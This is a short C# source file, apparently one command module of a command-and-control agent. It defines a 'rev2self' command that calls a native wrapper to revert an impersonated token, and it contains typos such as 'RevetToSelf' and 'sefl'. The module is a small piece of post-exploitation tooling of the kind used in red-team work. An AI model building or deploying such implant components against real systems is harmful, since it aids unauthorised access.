using Agent.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class RevToSelf :AgentsCommand
    {

        public override string Name => "rev2self";

        public override string Execute (AgentTask task)
        {

          if(Native.Advapi.RevetToSelf())
            {
                return "Reverted to sefl";

            }
            return "failed to revert ";

        }
    }
}
